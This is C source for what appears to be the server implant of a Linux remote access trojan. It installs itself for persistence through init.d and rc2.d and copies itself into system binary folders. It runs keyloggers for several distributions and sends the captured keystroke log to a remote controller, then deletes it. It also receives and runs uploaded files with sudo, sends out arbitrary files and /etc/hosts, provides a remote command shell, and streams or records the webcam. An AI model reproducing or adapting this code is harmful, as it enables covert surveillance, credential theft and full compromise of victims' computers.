#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/stat.h>  // umask(), S_ISDIR(), stat()

#include <stdio.h>
#include <unistd.h>
#include <syslog.h>  // syslog()
#include <getopt.h>

#include <pthread.h> //pthread_create(), pthread_join()

#include <gtk-2.0/gtk/gtk.h>

#include "../includes/constants.h"
#include "../includes/keylogger/keylogger.h"
#include "../includes/utils.h"

static SOCKET sock = 0;
static SOCKET csock = 0;

int main(int argc, char*argv[])
{
    /** Make hodin_daemon.sh script executable **/
    if(system("chmod +x script/hodin_daemon.sh") == -1)
    {
        error("system() make exec hodin_daemon.sh", "main()");
        return 0;
    }

    /** Make delete_startup.sh script executable **/
    if(system("chmod +x script/delete_startup.sh") == -1)
    {
        error("system() make exec delete_startup.sh", "main()");
        return 0;
    }

    /** Make startup.sh script executable **/
    if(system("chmod +x script/startup.sh") == -1)
    {
        error("system() make exec startup.sh", "main()");
        return 0;
    }

    /** Copy hodin_daemon.sh script in /etc/init.d **/
    if(system("cp script/hodin_daemon.sh /etc/init.d") == -1)
    {
        error("system() copy hodin_daemon.sh in /etc/init.d/", "main()");
        return 0;
    }

    /** Copy executable file in /usr/bin/ **/
    if(system("cp srv_hodin /usr/bin/") == -1)
    {
        error("system() copy srv_hodin in /usr/bin/", "main()");
        return 0;
    }

    /** Copy executable file in /usr/sbin/ **/
    if(system("cp srv_hodin /usr/sbin/") == -1)
    {
        error("system() copy srv_hodin in /usr/sbin/", "main()");
        return 0;
    }

    /** Create a symbolic link with hodin_daemon.sh **/
    if(system("ln -s /etc/init.d/hodin_daemon.sh /etc/rc2.d/S88hodin_daemon.sh") == -1)
    {
        error("system() hodin_daemon.sh symbolic link", "main()");
        return 0;
    }



    //daemonize();

    //ubuntu16_keylogger_init();

    ubuntu18_keylogger_init();

    //mint_keylogger_init();

    //debian_keylogger_init();

    //kali_keylogger_init();

    //fedora_keylogger_init();

    /* Initialize GStreamer */
    gst_init(&argc, &argv);

    dispatch_modules(argv);

    return EXIT_SUCCESS;
}

void dispatch_modules(char *argv[])
{
    SOCKADDR_IN sin;
    socklen_t recsize = sizeof(sin);

    SOCKADDR_IN csin;
    socklen_t crecsize = sizeof(csin);

    int option = 1;
    size_t flag = 0;

    FILE *log_file = NULL;

    long dataSend = 0;
    long dataRead = 0;
    long totalSend = 0;
    long file_size = 0;
    char caractereLu = 0;
    int i = 0;

    char buffer[MAXDATASIZE] = "";

    pthread_t thread_remote_shell = 0;
    pthread_t thread_downloader = 0;
    pthread_t thread_hosts_downloader = 0;

    pthread_t stream_desktop = 0;
    pthread_t stream_webcam_thread = 0;
    pthread_t record_webcam_thread = 0;


    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sock == INVALID_SOCKET)
    {
        error("socket()", "dispatch_modules()");
        return;
    }

    memset(&sin, 0, sizeof(sin));
    sin.sin_addr.s_addr = htonl(INADDR_ANY);
    sin.sin_family      = AF_INET;
    sin.sin_port        = htons(PORT);

    if(setsockopt(sock, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, (char*)&option, sizeof(option)) == SOCKET_ERROR)
    {
        error("setsockopt()", "dispatch_modules()");
        return;
    }

    if(bind(sock, (SOCKADDR*)&sin, recsize) == SOCKET_ERROR)
    {
        error("bind()", "dispatch_modules()");
        return;
    }

    for(;;)
    {
        printf("\nServer en ecoute \n");

        if(listen(sock, 3) == SOCKET_ERROR)
        {
            error("listen,()", "dispatch_modules()");
            return;
        }

        csock = accept(sock, (SOCKADDR*)&sin, &crecsize);
        if(csock == INVALID_SOCKET)
        {
            error("accept()", "dispatch_modules()");
            return;
        }

        if(recv(csock, (char*)&flag, sizeof(flag), 0) == SOCKET_ERROR)
        {
            error("recv() flag", "dispatch_modules()");
            return;
        }

        printf("flag received : %ld\n", flag);


        if(flag == 1)
        {
            printf("\t\tSTARTING UBUNTU 16.04 KEYLOGGER ....\n");
            ubuntu16_keylogger_init();
        }

        if(flag == 2)
        {
            printf("\t\tSTARTING UBUNTU 18 KEYLOGGER ....\n");
            ubuntu18_keylogger_init();
        }

        if(flag == 3)
        {
            printf("\t\tSTARTING MINT 19 KEYLOGGER ....\n");
            mint_keylogger_init();
        }

        if(flag == 4)
        {
            printf("\t\tSTARTING DEBIAN 9 KEYLOGGER ....\n");
            debian_keylogger_init();
        }

        if(flag == 5)
        {
            printf("\t\tSTARTING KALI 2.0 KEYLOGGER ....\n");
            kali_keylogger_init();
        }

        if(flag == 11)
        {
            printf("\t\tSTARTING FEDORA 28 KEYLOGGER ....\n");
            fedora_keylogger_init();
        }

        if(flag == 6)
        {
            printf("\t\tSENDING LOG FILE ....\n");

            log_file = fopen("/var/log/userlog.log", "r+");
            if(log_file == NULL)
            {
                error("fopen() log_file", "dispatch_modules()");
                return;
            }

            while((caractereLu = fgetc(log_file)) != EOF)
            {
                buffer[i] = caractereLu;
                i++;
            }

            fseek(log_file, 0, SEEK_END);
            file_size = ftell(log_file);
            rewind(log_file);

            /** Envoie de la taille du fichier txt **/
            if(send(csock, (char*)&file_size, sizeof(file_size), 0) == SOCKET_ERROR)
            {
                error("send() file_size", "dispatch_modules()");
                return;

            }

            printf("Weight of the file send with success : %ld octets\n", file_size);

            do
            {
                dataRead = fread(buffer, sizeof(char), file_size, log_file);
                if(dataRead < 0)
                {
                    perror("fread ");
                    return;
                }

                dataSend = send(csock, buffer, file_size, 0);

                //printf("Envoie de %ld octets\n", dataSend);

                if(dataSend < 0)
                {
                    perror("send() ");
                    exit(errno);
                }

                totalSend += dataSend;

            }while(totalSend < file_size);

            printf("File totaly send with success : %ld\n", dataSend);

            fclose(log_file);

            if(system("rm -rf /var/log/userlog.log") == -1)
            {
                error("system() userlog.log", "dispatch_modules()");
                return;
            }

            //close(csock);
        }

        if(flag == 7)
        {
            printf("\t\tRECEVING UPLOADED FILE ...\n");
            recv_upload();
        }

        /* REMOTE SHELL */
        if(flag == 8)
        {
            printf("\t\tSTARTING REMOTE SHELL ....\n");

            if(pthread_create(&thread_remote_shell, NULL, (void*(*)(void*))start_remote_shell, argv) == -1)
            {
                error("pthread_create() start_remote_shell", "dispatch_modules()");
                return;
            }

            if (pthread_join(thread_remote_shell, NULL))
            {
                perror("pthread_join");

                return;
            }

            //start_remote_shell(csock, sock, argv);
        }

        if(flag == 9)
        {
            printf("\t\tSENDING FILE TO DOWNLOAD ....\n");

            if(pthread_create(&thread_downloader, NULL, (void*(*)(void*))send_dowloaded_file, NULL) == -1)
            {
                error("pthread_create() send_dowloaded_file", "dispatch_modules()");
                return;
            }

            if(pthread_join(thread_downloader, NULL))
            {
                perror("pthread_join");
                return;
            }

            //send_dowloaded_file();
        }


        if(flag == 10)
        {
            printf("\t\tSENDING HOSTS TO DOWNLOAD ....\n");

            if(pthread_create(&thread_hosts_downloader, NULL, (void*(*)(void*))send_hosts_file, NULL) == -1)
            {
                error("pthread_create() send_hosts_file", "dispatch_modules()");
                return;
            }

            if(pthread_join(thread_hosts_downloader, NULL))
            {
                perror("pthread_join");
                return;
            }

            //send_hosts_file();
        }

        if(flag == 12)
        {
            printf("\t\tSTREAM THE WEBCAM....\n");

            if(pthread_create(&stream_webcam_thread, NULL, (void*)execute_watch_cmd, NULL) == -1)
            {
                error("pthread_create() stream_webcam_thread", "dispatch_modules()");
                exit(-1);
            }

            if (pthread_join(stream_webcam_thread, NULL))
            {
                perror("pthread_join");

                return;
            }

            pthread_cancel(stream_webcam_thread);
            //get_remote_screen_resolution();
        }


        /**
        if(flag == 13)
        {
            printf("\t\tSTREAMING STARTED....\n");

            /** Call the thread that will execute the stream command
            if(pthread_create(&stream_desktop, NULL, (void*)execute_watch_cmd, NULL) == -1)
            {
                error("pthread_create() execute_watch_cmd", "dispatch_modules()");
                exit(-1);
            }

            if (pthread_join(stream_desktop, NULL))
            {
                perror("pthread_join");

                return;
            }

        }
        **/

        if(flag == 14)
        {
            printf("\t\tRECORD WEBCAM STARTED....\n");

            /** Call the thread that will execute the stream command **/
            if(pthread_create(&record_webcam_thread, NULL, (void*)record_webcam, NULL) == -1)
            {
                error("pthread_create() record_webcam_thread", "dispatch_modules()");
                exit(-1);
            }

            if(pthread_join(record_webcam_thread, NULL))
            {
                perror("pthread_join");
                return;
            }

        }
    }

    return;
}


void recv_upload()
{
    FILE *log = NULL;
    FILE *pipe[3] = {NULL};

    long tailleBlockRecut = 0;
    long totalRcv = 0;
    char *buffer = NULL;

    char *cmd_1 = NULL;
    char *cmd_2 = NULL;
    char *cmd_3 = NULL;

    long weight = 0;
    size_t len = 0;

    char *log_name = NULL;
    int installed = 0;

    if(recv(csock, (char*)&weight, sizeof(weight), 0) != SOCKET_ERROR)
        printf("\n\nPoid du fichier reçut : %ld octets\n", weight);

    else
    {
        error("recv() weight", "recv_upload()");
        return;
    }

    buffer = malloc(weight * sizeof(char));
    if(buffer == NULL)
    {
        error("malloc() buffer", "recv_upload()");
        return;
    }

    if(recv(csock, (char*)&len, sizeof(len), 0) == SOCKET_ERROR)
        error("recv() len", "recv_upload()");

    log_name = malloc(len * sizeof(char));
    if(log_name == NULL)
    {
        error("malloc() log_name", "recv_upload()");
        return;
    }

    if(recv(csock, log_name, len, 0) == SOCKET_ERROR)
        error("recv() log_name", "recv_upload()");

    log = fopen(log_name, "wb");
    if(log == NULL)
    {
        error("fopen() log", "recv_upload()");
        return;
    }

    cmd_1 = malloc((15 + len) * sizeof(char));
    if(cmd_1 == NULL)
    {
        error("malloc() cmd_1", "recv_upload()");
        return;
    }

    cmd_2 = malloc((14 + len) * sizeof(char));
    if(cmd_2 == NULL)
    {
        error("malloc() cmd_2", "recv_upload()");
        return;
    }

    cmd_3 = malloc(weight * sizeof(char));
    if(cmd_3 == NULL)
    {
        error("malloc() cmd_3", "recv_upload()");
        return;
    }

    cmd_1 = strcpy(cmd_1, "sudo chmod 777 ");
    cmd_1 = strcat(cmd_1, log_name);

    cmd_2 = strcpy(cmd_2, "sudo chmod +x ");
    cmd_2 = strcat(cmd_2, log_name);

    cmd_3 = strcpy(cmd_3, "sudo ");
    cmd_3 = strcat(cmd_3, "./");
    cmd_3 = strcat(cmd_3, log_name);

    do
    {
        tailleBlockRecut = recv(csock, buffer, sizeof(weight), 0);

        fwrite(buffer, sizeof(char), (size_t)tailleBlockRecut, log);

        totalRcv += tailleBlockRecut;

    }while(totalRcv < weight);


    pipe[0] = popen(cmd_1, "r");
    if(pipe[0] == NULL)
    {
        error("popen() pipe[0]", "recv_upload()");
        return;
    }

    fclose(log);
    pclose(pipe[0]);

    pipe[1] = popen(cmd_2, "r");
    if(pipe[1] == NULL)
    {
        error("popen() pipe[1]", "recv_upload()");
        return;
    }

    pipe[2] = popen(cmd_3, "r");
    if(pipe[2] == NULL)
    {
        error("popen() pipe[2]", "recv_upload()");

        installed = 0;
        if(send(csock, (char*)&installed, sizeof(installed), 0) == -1)
            error("send() installed pipe[2]", "recv_upload()")

        pclose(pipe[1]);
        pclose(pipe[2]);

        free(log_name);

        free(buffer);
        free(cmd_1);
        free(cmd_2);
        free(cmd_3);

        return;
    }

    pclose(pipe[1]);
    pclose(pipe[2]);
    installed = 1;

    if(send(csock, (char*)&installed, sizeof(installed), 0) == -1)
        error("send() installed", "recv_upload()")

    free(log_name);

    free(buffer);

    free(cmd_1);
    free(cmd_2);
    free(cmd_3);

    return;
}

void *send_dowloaded_file()
{
    gchar *file_path = NULL;
    size_t len_file_path = 0;

    FILE *on_download = NULL;

    char *buffer = NULL;

    long dataSend = 0;
    long dataRead = 0;
    long totalSend = 0;
    long file_size = 0;

    if(recv(csock, (char*)&len_file_path, sizeof(len_file_path), 0) == -1)
    {
        error("recv() len_file_path", "send_dowloaded_file()");
        return;
    }

    file_path = malloc(len_file_path * sizeof(char));
    if(file_path == NULL)
    {
        error("malloc() file_path", "send_dowloaded_file()");
        return;
    }

    printf("len path = %ld\n\n", len_file_path);

    if(recv(csock, file_path, len_file_path, 0) == -1)
    {
        error("recv() file_path", "send_dowloaded_file()");
        return;
    }

    printf("path = %s\n", file_path);


    struct stat *fichier = malloc(sizeof(struct stat));

    stat(file_path, fichier);
    if(S_ISDIR(fichier->st_mode) == 1)
    {
        free(file_path);
        return;
    }

    on_download = fopen(file_path, "rb");
    if(on_download == NULL)
    {
        error("fopen() on_download", "send_dowloaded_file()");
        return;
    }

    fseek(on_download, 0, SEEK_END);
    file_size = ftell(on_download);
    rewind(on_download);

    /** Envoie de la taille du fichier txt **/
    if(send(csock, (char*)&file_size, sizeof(file_size), 0) == SOCKET_ERROR)
    {
        error("send() file_size", "send_dowloaded_file()");
        return;

    }

    printf("Weight of the file send with success : %ld octets\n", file_size);

    buffer = malloc(file_size * sizeof(char));
    if(buffer == NULL)
    {
        error("malloc() buffer", "send_dowloaded_file()");
        free(file_path);
        fclose(on_download);
        return;
    }

    do
    {
        dataRead = fread(buffer, file_size, sizeof(char), on_download);
        if(dataRead < 0)
        {
            perror("fread ");
            return;
        }

        dataSend = send(csock, buffer, file_size, 0);

        if(dataSend < 0)
        {
            perror("send() ");
            return;
        }

        totalSend += dataSend;

    }while(totalSend < file_size);

    printf("File totaly send with success : %ld\n", dataSend);

    fclose(on_download);

    free(fichier);
    free(file_path);
    free(buffer);

    pthread_exit(NULL);
}

void *send_hosts_file()
{
    gchar file_path[256] = "/etc/hosts";
    size_t len_hosts_path = strlen(file_path) + 1;

    FILE *hosts_download = NULL;

    char buffer[MAXDATASIZE] = "";

    long dataSend = 0;
    long dataRead = 0;
    long totalSend = 0;
    long file_size = 0;

    if(send(csock, (char*)&len_hosts_path, sizeof(len_hosts_path), 0) == -1)
    {
        error("send() len_hosts_path", "dispatch_modules()");
        return 0;
    }

    printf("path len sended .... %ld\n\n", len_hosts_path);

    if(send(csock, file_path, len_hosts_path, 0) == -1)
    {
        error("recv() file_path", "dispatch_modules()");
        return 0;
    }

    printf("path sended  %s....", file_path);

    hosts_download = fopen(file_path, "rb");
    if(hosts_download == NULL)
    {
        error("fopen() hosts_download", "dispatch_modules()");
        return 0;
    }

    fseek(hosts_download, 0, SEEK_END);
    file_size = ftell(hosts_download);
    rewind(hosts_download);

    /** Envoie de la taille du fichier txt **/
    if(send(csock, (char*)&file_size, sizeof(file_size), 0) == SOCKET_ERROR)
    {
        error("send() file_size", "dispatch_modules()");
        return 0;
    }

    printf("weight of hosts file sended.... %ld\n\n", file_size);

    do
    {
        dataRead = fread(buffer, file_size, sizeof(char), hosts_download);
        if(dataRead < 0)
        {
            perror("fread ");
            return 0;
        }

        dataSend = send(csock, buffer, file_size, 0);

        //printf("Envoie de %ld octets\n", dataSend);

        if(dataSend < 0)
        {
            perror("send() dataSend");
            return 0;
        }

        totalSend += dataSend;

    }while(totalSend < file_size);

    printf("File totaly send with success : %ld\n", dataSend);

    fclose(hosts_download);

    pthread_exit(NULL);
}


/** Remote shell **/
void *start_remote_shell(char *argv[])
{
    pid_t the_son = 0;
    char *shell = NULL;

    FILE *pipe[2] = {NULL};

    char buffer[BUFSIZ]= "";
    char buffer_cmd[MAXDATASIZE] = "";
    size_t data_len = 0;
    int ret = 0;

    char connected_msg[] = "You're now connected to the server ...\r\n";
    int connected_msg_len = strlen(connected_msg) + 1;


    ret = send(csock, (char*)&connected_msg_len, sizeof(connected_msg_len), 0);
    if(ret < 0)
    {
        error("send() connected_msg_len", "start_remote_shell()");
        return;
    }

    ret = send(csock, connected_msg, connected_msg_len, 0);
    if(ret < 0)
    {
        error("send() connected_msg", "start_remote_shell()");
        return;
    }

    the_son = fork();
    if(the_son < 0)
    {
        error("fork() the_son", "start_remote_shell()");
        return;
    }

    if(the_son == 0)
    {
        shell = getenv("SHELL");

        if(shell == NULL)
        {
            error("getenv() shell", "start_remote_shell()");
            return;
        }

        if(execv(shell, &argv[0]) == -1)
        {
            error("execv() shell", "start_remote_shell()");
            return;
        }
    }

    else /*father*/
    {
        for(;;)
        {
            if(recv(csock, (char*)&data_len, sizeof(data_len), 0) == -1)
            {
                error("recv() data_len", "start_remote_shell()");
                return;
            }

            /* Receive the command */
            ret = recv (csock, buffer, data_len, 0);
            if (ret < 0)
            {
                error("recv() buffer", "start_remote_shell()");
                return;
            }

            buffer[data_len - 1] = '\0';

            if(strncmp(buffer, "quit", 4) == 0)
            {
                memset(buffer_cmd, 0, MAXDATASIZE);
                memset(buffer, 0, BUFSIZ);

                shutdown(csock, SHUT_RDWR);
                pthread_exit(NULL);
            }

            /*
            pipe[0] = popen(buffer, "w");
            if(pipe[0] == NULL)
            {
                error("popen() pipe[0]", "start_remote_shell()");
                return;
            }
            */

            /* Send command results */
            pipe[1] =  popen(buffer, "r");
            if(pipe[1] == NULL)
            {
                error("popen() pipe[1]", "start_remote_shell()");
                return;
            }

            ret = fread(buffer_cmd, MAXDATASIZE, sizeof(char), pipe[1]);
            if(ret < 0)
            {

                error("fread() buffer_cmd", "start_remote_shell()");
                return;
            }

            if(send(csock, buffer_cmd, BUFSIZ, 0) == SOCKET_ERROR)
            {
                error("send() buffer_cmd", "start_remote_shell()");
                return;
            }

            memset(buffer_cmd, 0, MAXDATASIZE);
            memset(buffer, 0, BUFSIZ);

            /*
            if(pclose(pipe[0]) == -1)
            {
                error("pclose() pipe[0]", "start_remote_shell()");
                return;
            }
            */

            if(pclose(pipe[1]) == -1)
            {
                error("pclose() pipe[1]", "start_remote_shell()");
                return;
            }
        }
    }

    return;
}


void execute_watch_cmd()
{
    size_t len_watch_cmd = 0;
    char *buffer = NULL;

    GstElement *pipeline;
    GstBus *bus;
    GstStateChangeReturn ret;
    GMainLoop *main_loop;
    CustomData data;

    if(recv(csock, (char*)&len_watch_cmd, sizeof(len_watch_cmd), 0) == SOCKET_ERROR)
    {
        error("recv() len_watch_cmd", "execute_watch_cmd()");
        return;
    }

    buffer = malloc(len_watch_cmd * sizeof(char));
    if(buffer == NULL)
    {
        error("malloc() buffer", "execute_watch_cmd()");
         return;
    }

    if(recv(csock, buffer, len_watch_cmd, 0) == SOCKET_ERROR)
    {
        error("recv() buffer", "execute_watch_cmd()");
        return;
    }

     /* Initialize our data structure */
    memset (&data, 0, sizeof (data));

    /* Build the pipeline */
    pipeline = gst_parse_launch(buffer, NULL);
    bus = gst_element_get_bus (pipeline);

    /* Start playing */
    ret = gst_element_set_state (pipeline, GST_STATE_PLAYING);

    if(ret == GST_STATE_CHANGE_FAILURE)
    {
        g_printerr ("Unable to set the pipeline to the playing state.\n");
        gst_object_unref (pipeline);
        return;
    }

    else if(ret == GST_STATE_CHANGE_NO_PREROLL)
    {
        data.is_live = TRUE;
    }

    main_loop = g_main_loop_new (NULL, FALSE);
    data.loop = main_loop;
    data.pipeline = pipeline;

    gst_bus_add_signal_watch (bus);
    g_signal_connect(bus, "message", G_CALLBACK(cb_message), &data);

    free(buffer);
    g_main_loop_unref (main_loop);
    gst_object_unref (bus);
    //gst_element_set_state (pipeline, GST_STATE_NULL);
    gst_object_unref (pipeline);

    pthread_exit(NULL);

    g_main_loop_run(main_loop);

    /* Free resources
    g_main_loop_unref (main_loop);
    gst_object_unref (bus);
    gst_element_set_state (pipeline, GST_STATE_NULL);
    gst_object_unref (pipeline);

    free(buffer);

    */

}

void cb_message(GstBus *bus, GstMessage *msg, CustomData *data)
{
    switch (GST_MESSAGE_TYPE (msg))
    {
        case GST_MESSAGE_ERROR:
        {
            GError *err;
            gchar *debug;

            gst_message_parse_error (msg, &err, &debug);
            g_print ("Error: %s\n", err->message);
            g_error_free (err);
            g_free (debug);

            gst_element_set_state (data->pipeline, GST_STATE_READY);
            g_main_loop_quit (data->loop);
            break;
        }

        case GST_MESSAGE_EOS:
            /* end-of-stream */
            gst_element_set_state (data->pipeline, GST_STATE_READY);
            g_main_loop_quit (data->loop);
            break;

        case GST_MESSAGE_BUFFERING:
        {
            gint percent = 0;

            /* If the stream is live, we do not care about buffering. */
            if (data->is_live) break;

            gst_message_parse_buffering (msg, &percent);
            g_print ("Buffering (%3d%%)\r", percent);

            /* Wait until buffering is complete before start/resume playing */
            if (percent < 100)
                gst_element_set_state (data->pipeline, GST_STATE_PAUSED);

            else
                gst_element_set_state (data->pipeline, GST_STATE_PLAYING);

            break;
        }

        case GST_MESSAGE_CLOCK_LOST:

            /* Get a new clock */
            gst_element_set_state (data->pipeline, GST_STATE_PAUSED);
            gst_element_set_state (data->pipeline, GST_STATE_PLAYING);
            break;

        default:
            /* Unhandled message */
            break;
    }
}

void record_webcam()
{
    size_t len_record_cmd = 0;
    char *buffer = NULL;

    FILE *pipe = NULL;

    GstElement *pipeline;
    GstBus *bus;
    GstStateChangeReturn ret;
    GMainLoop *main_loop;
    CustomData data;

    if(recv(csock, (char*)&len_record_cmd, sizeof(len_record_cmd), 0) == SOCKET_ERROR)
    {
        error("recv() len_record_cmd", "record_webcam()");
        exit(-1);
    }

    buffer = malloc(len_record_cmd * sizeof(char));
    if(buffer == NULL)
    {
        error("malloc() buffer", "record_webcam()");
        exit(-1);
    }

    if(recv(csock, buffer, len_record_cmd, 0) == SOCKET_ERROR)
    {
        error("recv() buffer", "record_webcam()");
        exit(-1);
    }

    /* Execute cmd */
    pipe = popen(buffer, "r");
    if(pipe == NULL)
    {
        error("popen() pipe", "record_webcam()");
        return;
    }
}


void daemonize()
{

    pid_t fils;

    fils = fork();

    /** If fork() fail we quit **/
    if(fils < 0)
    {
        syslog(LOG_ERR, "fork() fils : %d : %s", errno, strerror(errno));
        return;
    }

    /** If fork() succeed we stop the father **/
    if(fils > 0)
        exit(EXIT_SUCCESS);

    /** Change of directory and we place us to the root folder **/
    if(chdir("/") < 0)
    {
        syslog(LOG_ERR, "chdir() : %d : %s", errno, strerror(errno));
        return;
    }

    /** No rights on the files/folder created **/
    umask(0);


    /**  Redirect standard I/O for cancel all user terminal messages **/
    if(freopen("/dev/null", "r", stdin) == NULL )
    {
        error("freopen() stdin", "daemonize_keylogger()");
        return;
    }

    if(freopen("/dev/null", "w", stdout) == NULL )
    {
        error("freopen stdout", "daemonize_keylogger()");
        return;
    }

    if(freopen("/dev/null", "w", stderr) == NULL )
    {
        error("freopen stderr", "daemonize_keylogger()");
        return;
    }

    return;
}



